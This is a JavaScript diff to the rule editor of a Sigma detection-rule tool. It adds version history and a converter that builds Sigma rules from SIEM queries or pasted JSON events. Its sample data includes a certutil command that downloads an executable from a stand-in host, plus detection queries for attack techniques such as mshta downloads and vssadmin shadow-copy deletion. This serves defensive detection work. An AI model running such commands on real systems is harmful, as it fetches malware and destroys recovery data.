@@ -3,7 +3,9 @@ import { mappings } from "../mappings.js";
 import { trackState } from "../router.js";
 import { state } from "../state.js";
 import { store } from "../store.js";
-import { $, $$, copyText, debounce, download, esc, forging, icons, levelBadge, openDrawer, plural, toast } from "../ui.js";
+import { takeIncoming, clearHistory, diffHtml, diffStats, fmtTime, lineDiff, paintMeters, pushHistory, qualityBadge, qualityList, readHistory } from "../shared.js";
+import { $, $$, closeDrawer, copyText, debounce, download, esc, forging, icons, levelBadge, openDrawer, plural, setDrawerBody, toast } from "../ui.js";
+import { ruleFromEvent } from "./results.js";
 
 const DRAFT_KEY = "sigma-forge-draft";
 const PREF_KEY = "sigma-forge-editor";
@@ -222,6 +224,8 @@ export async function editorView(root, route) {
               ${Object.entries(TEMPLATES).map(([k, t]) => `<option value="${k}">${esc(t.label)}</option>`).join("")}
             </select>
             <button class="btn btn--sm" type="button" id="edOpen">${icons.folder} Open</button>
+            <button class="btn btn--sm" type="button" id="edFromQuery" title="Turn a Splunk, KQL, Elastic query or an event into a Sigma rule">${icons.spark} From query or event</button>
+            <button class="btn btn--sm" type="button" id="edHistory" title="Saved versions of this file">${icons.grid} History <span class="badge" id="edHistCount">0</span></button>
             <button class="btn btn--sm" type="button" id="edDownload">${icons.download} Download</button>
             <button class="btn btn--sm btn--primary" type="button" id="edSave">${icons.file} Save to workspace</button>
           </div>
@@ -262,9 +266,14 @@ export async function editorView(root, route) {
   let seq = 0;
 
   const rules = await state.rules();
+  const incoming = takeIncoming();
   const draft = readJson(DRAFT_KEY);
   const fromRoute = route.file ? rules.find((r) => r.name === route.file) : null;
-  if (fromRoute) {
+  if (incoming?.content) {
+    openedId = incoming.openedId || "";
+    nameInput.value = incoming.name || "new_rule.yml";
+    text.value = incoming.content;
+  } else if (fromRoute) {
     openedId = fromRoute.id;
     nameInput.value = fromRoute.name;
     text.value = fromRoute.content;
@@ -335,14 +344,17 @@ export async function editorView(root, route) {
             <strong>${esc(r.title || r.file)}</strong>
             ${r.kind === "correlation" ? '<span class="badge badge--accent">correlation</span>' : ""}
             ${r.level ? levelBadge(r.level) : ""}
+            ${qualityBadge(r.quality)}
           </div>
           ${r.error ? `<div class="notice notice--bad">${esc(r.error)}</div>` : ""}
           ${(r.issues || []).map((i) => `<div class="notice notice--warn">${severityBadge(i.severity)} <span>${esc(i.message)}</span></div>`).join("")}
           ${!r.error && !(r.issues || []).length ? '<div class="notice notice--ok">No findings</div>' : ""}
+          ${r.quality && !r.error ? `<details class="editor__quality"><summary>Quality score ${r.quality.score} of 100, grade ${esc(r.quality.grade)}</summary>${qualityList(r.quality)}</details>` : ""}
           ${r.logsource ? `<div class="editor__meta"><span>Log source</span><span class="mono">${esc([r.logsource.product, r.logsource.category, r.logsource.service].filter(Boolean).join(" / ") || "none")}</span></div>` : ""}
         </div>`
       )
       .join("");
+    paintMeters(box);
   }
 
   function renderAttack(analysis) {
@@ -504,6 +516,8 @@ export async function editorView(root, route) {
     }
     try {
       const saved = await store.replace(openedId, f);
+      pushHistory(f.name, f.content);
+      paintHistCount();
       openedId = saved?.id || "";
       nameInput.value = f.name;
       saveDraft();
@@ -550,6 +564,169 @@ export async function editorView(root, route) {
     });
   });
 
+  function paintHistCount() {
+    $("#edHistCount", root).textContent = String(readHistory(file().name).length);
+  }
+  nameInput.addEventListener("input", debounce(paintHistCount, 300));
+
+  function loadText(name, content, id = "") {
+    openedId = id;
+    nameInput.value = name;
+    setText(content);
+    paintGutter();
+    paintHistCount();
+    refresh();
+  }
+
+  $("#edHistory", root).addEventListener("click", () => {
+    const name = file().name;
+    const list = readHistory(name);
+    const listHtml = () => {
+      const items = readHistory(name);
+      if (!items.length) return `<p class="muted">No saved versions of ${esc(name)} yet. Each time you press Save to workspace (or Ctrl+S) a version is kept here, up to 30 per file.</p>`;
+      return `<p class="muted">Versions of <span class="mono">${esc(name)}</span>, newest first. Compared with what is in the editor now.</p>
+        <div class="card mt-4"><ul class="list">${items
+          .map((v, i) => {
+            const st = diffStats(lineDiff(v.content, text.value));
+            return `<li class="list__item"><div class="list__main"><div class="list__title">${esc(fmtTime(v.t))}${i === 0 ? ' <span class="badge badge--accent">latest</span>' : ""}</div><div class="list__meta">${esc(plural(v.content.split("\n").length, "line"))} · <span class="diff__count diff__count--add">+${st.added}</span> <span class="diff__count diff__count--del">-${st.removed}</span> vs editor</div></div><button class="btn btn--sm" type="button" data-view="${i}">Diff</button><button class="btn btn--sm" type="button" data-restore="${i}">Restore</button></li>`;
+          })
+          .join("")}</ul></div>
+        <div class="row mt-4"><div class="spacer"></div><button class="btn btn--sm btn--ghost" type="button" id="histClear">${icons.trash} Clear history</button></div>`;
+    };
+    const bind = (panel) => {
+      panel.onclick = (e) => {
+        const items = readHistory(name);
+        const view = e.target.closest("[data-view]");
+        const restore = e.target.closest("[data-restore]");
+        const back = e.target.closest("[data-back]");
+        if (back) {
+          setDrawerBody(listHtml(), bind);
+          return;
+        }
+        if (view) {
+          const v = items[Number(view.dataset.view)];
+          const rows = lineDiff(v.content, text.value);
+          const st = diffStats(rows);
+          setDrawerBody(`<div class="row"><button class="btn btn--sm" type="button" data-back>Back</button><span class="muted">${esc(fmtTime(v.t))} to editor: <span class="diff__count diff__count--add">+${st.added}</span> <span class="diff__count diff__count--del">-${st.removed}</span></span><div class="spacer"></div><button class="btn btn--sm btn--primary" type="button" data-restore="${view.dataset.view}">Restore this version</button></div><div class="card mt-4">${diffHtml(rows)}</div>`, bind);
+          return;
+        }
+        if (restore) {
+          const v = items[Number(restore.dataset.restore)];
+          pushHistory(name, text.value, "before restore");
+          loadText(name, v.content, openedId);
+          closeDrawer();
+          toast("Version restored. Save to keep it in the workspace.", "ok");
+          return;
+        }
+        if (e.target.closest("#histClear")) {
+          clearHistory(name);
+          paintHistCount();
+          setDrawerBody(listHtml(), bind);
+        }
+      };
+    };
+    openDrawer(list.length ? `History, ${plural(list.length, "version")}` : "History", listHtml(), bind);
+  });
+
+  $("#edFromQuery", root).addEventListener("click", async () => {
+    let langs = {};
+    try {
+      langs = (await api.queryLanguages()).languages;
+    } catch {
+      langs = { auto: "Detect it for me" };
+    }
+    const body = `
+      <div class="tabs tabs--inline" id="fqTabs">
+        <button class="tab is-active" type="button" data-fq="query">From a query</button>
+        <button class="tab" type="button" data-fq="event">From an event</button>
+      </div>
+      <div data-fqpane="query" class="mt-4">
+        <p class="muted">Paste a search from Splunk, Microsoft Sentinel or Defender, Elastic or Kibana. Sigma Forge reads the filters, maps the fields to Sigma names and guesses the log source.</p>
+        <label class="field"><span class="field__label">Query language</span><select class="select" id="fqLang">${Object.entries(langs).map(([k, v]) => `<option value="${esc(k)}">${esc(v)}</option>`).join("")}</select></label>
+        <label class="field"><span class="field__label">Query</span><textarea class="textarea mono" id="fqText" rows="8" spellcheck="false" placeholder='index=windows EventCode=1 Image="*\\powershell.exe" CommandLine="*-enc*"'></textarea></label>
+        <div class="row"><span class="muted" id="fqExamples"></span><div class="spacer"></div><button class="btn btn--primary" type="button" id="fqGo">${icons.spark} Make the rule</button></div>
+        <div id="fqOut" class="mt-4"></div>
+      </div>
+      <div data-fqpane="event" class="mt-4" hidden>
+        <p class="muted">Paste one event as JSON (Sysmon, Windows event, CloudTrail, anything flat or nested). Then pick the fields that matter.</p>
+        <label class="field"><span class="field__label">Event JSON</span><textarea class="textarea mono" id="feText" rows="10" spellcheck="false" placeholder='{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -f http://x/a.exe a.exe"}'></textarea></label>
+        <div class="row"><div class="spacer"></div><button class="btn btn--primary" type="button" id="feGo">${icons.spark} Pick fields</button></div>
+      </div>`;
+    const EXAMPLES = {
+      splunk: 'index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\certutil.exe" (CommandLine="*urlcache*" OR CommandLine="*-decode*")',
+      kql: 'DeviceProcessEvents\n| where FileName in~ ("rundll32.exe", "regsvr32.exe")\n| where ProcessCommandLine contains "http"\n| where not(InitiatingProcessFileName =~ "msiexec.exe")',
+      lucene: 'event.code:1 AND process.name:("mshta.exe" OR "wscript.exe") AND process.command_line:*http*',
+      eql: 'process where process.name : "vssadmin.exe" and process.args : ("delete", "shadows")',
+    };
+    openDrawer("New rule from a query or an event", body, (panel) => {
+      $("#fqExamples", panel).innerHTML = `Try: ${Object.keys(EXAMPLES).map((k) => `<button class="link-btn" type="button" data-ex="${k}">${esc(k === "kql" ? "KQL" : k === "eql" ? "EQL" : k === "lucene" ? "Kibana" : "Splunk")}</button>`).join(" ")}`;
+      let last = null;
+      panel.addEventListener("click", async (e) => {
+        const tab = e.target.closest("[data-fq]");
+        if (tab) {
+          $$("#fqTabs .tab", panel).forEach((t) => t.classList.toggle("is-active", t === tab));
+          $$("[data-fqpane]", panel).forEach((p) => (p.hidden = p.dataset.fqpane !== tab.dataset.fq));
+          return;
+        }
+        const ex = e.target.closest("[data-ex]");
+        if (ex) {
+          $("#fqText", panel).value = EXAMPLES[ex.dataset.ex].replace(/\\n/g, "\n");
+          $("#fqLang", panel).value = ex.dataset.ex in langs ? ex.dataset.ex : "auto";
+          return;
+        }
+        if (e.target.closest("#fqGo")) {
+          const q = $("#fqText", panel).value.trim();
+          if (!q) {
+            toast("Paste a query first", "bad");
+            return;
+          }
+          $("#fqOut", panel).innerHTML = '<div class="skeleton sk-block"></div>';
+          try {
+            last = await api.queryGen(q, $("#fqLang", panel).value);
+            const mapped = Object.entries(last.mapped || {});
+            $("#fqOut", panel).innerHTML = `
+              <div class="row"><span class="badge badge--accent">${esc(last.language_name)}</span><span class="muted mono">${esc(Object.entries(last.logsource).map(([k, v]) => `${k}: ${v}`).join(", "))}</span></div>
+              ${last.error ? `<div class="notice notice--bad mt-4">${esc(last.error)}</div>` : ""}
+              ${(last.warnings || []).map((w) => `<div class="notice notice--warn mt-4">${esc(w)}</div>`).join("")}
+              ${mapped.length ? `<div class="card mt-4"><div class="card__head"><span class="card__title">Field names changed</span></div><div class="card__body chips">${mapped.map(([a, b]) => `<span class="chip"><span class="mono">${esc(a)}</span> to <span class="mono">${esc(b)}</span></span>`).join("")}</div></div>` : ""}
+              <div class="card mt-4"><pre class="code code--tall">${esc(last.yaml)}</pre></div>
+              <div class="row mt-4"><div class="spacer"></div><button class="btn btn--sm" type="button" id="fqCopy">${icons.copy} Copy</button><button class="btn btn--primary" type="button" id="fqOpen">${icons.file} Open in editor</button></div>`;
+          } catch (err) {
+            $("#fqOut", panel).innerHTML = `<div class="notice notice--bad">${esc(err.message)}</div>`;
+          }
+          return;
+        }
+        if (e.target.closest("#fqCopy") && last) {
+          copyText(last.yaml, "Rule copied");
+          return;
+        }
+        if (e.target.closest("#fqOpen") && last) {
+          const title = (last.yaml.match(/^title:\s*(.+)$/m) || [])[1] || "converted_query";
+          const name = `${title.replace(/['"]/g, "").toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "").slice(0, 60) || "converted_query"}.yml`;
+          closeDrawer();
+          loadText(name, last.yaml);
+          toast("Rule loaded. Check it, then save.", "ok");
+          return;
+        }
+        if (e.target.closest("#feGo")) {
+          let ev;
+          try {
+            ev = JSON.parse($("#feText", panel).value);
+          } catch (err) {
+            toast(`Not valid JSON: ${err.message}`, "bad");
+            return;
+          }
+          if (!ev || typeof ev !== "object" || Array.isArray(ev)) {
+            toast("Paste one JSON object", "bad");
+            return;
+          }
+          ruleFromEvent(ev, ev.logsource || null);
+        }
+      });
+    });
+  });
+
+  paintHistCount();
   paintGutter();
   $("#edChecks", root).innerHTML = forging("Checking the rule");
   try {
